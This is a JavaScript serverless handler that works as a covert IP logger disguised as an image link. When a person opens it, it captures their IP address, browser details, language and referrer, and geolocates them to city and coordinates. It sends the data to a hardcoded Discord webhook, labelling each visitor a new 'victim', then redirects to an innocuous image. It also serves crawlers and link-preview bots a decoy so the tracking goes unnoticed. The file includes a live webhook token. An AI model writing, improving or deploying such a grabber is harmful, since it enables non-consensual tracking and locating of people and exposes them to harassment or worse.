// PRIVATE TIER - /private
module.exports = async function handler(req, res) {
  if (req.method !== "GET" && req.method !== "HEAD") {
    return res.status(405).send("Method Not Allowed");
  }

  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1531056914400809040/MJKgBcokn72raMLVOaAAFfq7horTYCr-0DrDh3rViVWCt9MnaC0RF4gyjw7IrrUglEcM";
  const TARGET_IMAGE = "https://i.imgur.com/7tR8X9W.jpeg";
  const BOT_IMAGE = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3BwZ3c3ZnpxZXR0aTl5NzF1dTN3MXltMHFrNnl2aWh1dmI3anNzYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/IzigGVSs9fHjug20Mq/giphy.gif";
  const BANNER = "https://i.pinimg.com/originals/ce/7a/b8/ce7ab8a1b0f0d4d2a41f664d4fe97384.gif";

  const ip = req.headers["cf-connecting-ip"] || req.headers["x-vercel-forwarded-for"]?.split(",")[0] || req.headers["x-forwarded-for"]?.split(",")[0] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "Unknown";
  const ua = req.headers["user-agent"] || "Unknown";
  const referer = req.headers["referer"] || req.headers["referrer"] || "Directo";
  const acceptLang = req.headers["accept-language"] || "Unknown";
  const acceptEncoding = req.headers["accept-encoding"] || "Unknown";
  const accept = req.headers["accept"] || "Unknown";
  const isSecure = req.headers["x-forwarded-proto"] === "https" || req.headers["x-vercel-proxy-request"] === "1";
  const endpoint = req.url || "/private";

  const ignoreAgents = ["vercel", "vercel-favicon", "node", "axios", "curl", "wget", "uptime", "statuscake"];
  if (new RegExp(ignoreAgents.join("|"), "i").test(ua)) {
    return res.redirect(302, TARGET_IMAGE);
  }

  if (/(bot|crawler|spider|discordbot|telegrambot|slackbot|facebookexternalhit|twitterbot|linkedinbot|pinterest|whatsapp|skypeuripreview|googlebot|bingbot|yandex)/i.test(ua) || req.method === "HEAD") {
    return res.redirect(302, BOT_IMAGE);
  }

  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes("firefox")) return "Firefox";
    if (u.includes("edg")) return "Edge";
    if (u.includes("brave")) return "Brave";
    if (u.includes("chrome") && !u.includes("edg")) return "Chrome";
    if (u.includes("safari") && !u.includes("chrome")) return "Safari";
    return "Unknown";
  })();

  const device = /mobile|android|iphone/i.test(ua) ? "📱 Mobile" : /ipad|tablet/i.test(ua) ? "📟 Tablet" : "🖥️ Desktop";
  const system = /windows/i.test(ua) ? "Windows" : /android/i.test(ua) ? "Android" : /iphone|ios/i.test(ua) ? "iOS" : /mac/i.test(ua) ? "MacOS" : /linux/i.test(ua) ? "Linux" : "Unknown";

  let geo = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,query`);
    if (geoRes.ok) geo = await geoRes.json();
  } catch {}

  const fingerprint = Buffer.from(`${ua}|${acceptLang}|${acceptEncoding}|${accept}`).toString('base64').substring(0, 20);

  const embed = {
    title: `📡 CAPTURA · PRIVADO · ${endpoint}`,
    color: 0xff0044,
    image: { url: BANNER },
    fields: [
      { name: "📍 Ubicación", value: `${geo.city || "Desconocida"}, ${geo.regionName || ""}, ${geo.country || "Desconocido"}`, inline: false },
      { name: "🌐 Dirección IP", value: `\`${ip}\``, inline: true },
      { name: "🗺️ Coordenadas", value: `${geo.lat || "?"}, ${geo.lon || "?"}`, inline: true },
      { name: "🏢 Proveedor", value: geo.isp || "Desconocido", inline: true },
      { name: "🏛️ Organización", value: geo.org || "Desconocida", inline: true },
      { name: "🕒 Zona Horaria", value: geo.timezone || "Desconocida", inline: true },
      { name: "🌐 Idioma", value: acceptLang, inline: true },
      { name: "🔗 Origen", value: referer.length > 80 ? referer.substring(0, 80) + "..." : referer, inline: false },
      { name: "🔍 Huella Digital", value: `\`${fingerprint}\``, inline: true },
      { name: "🔐 Conexión", value: isSecure ? "✅ HTTPS" : "❌ HTTP", inline: true },
      { name: "📦 Codificación", value: acceptEncoding || "Desconocida", inline: true },
      { name: "💻 Sistema", value: system, inline: true },
      { name: "🌍 Navegador", value: browser, inline: true },
      { name: "🖥️ Tipo", value: device, inline: true },
      { name: "📜 User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
    ],
    footer: {
      text: `Privado · ${endpoint} · ${new Date().toLocaleString()}`
    },
    timestamp: new Date().toISOString()
  };

  const payload = {
    content: "@everyone 🔔 NUEVA VÍCTIMA EN " + endpoint,
    allowed_mentions: { parse: ["everyone"] },
    username: "Private Logger",
    embeds: [embed]
  };

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(() => {});

  return res.redirect(302, TARGET_IMAGE);
};
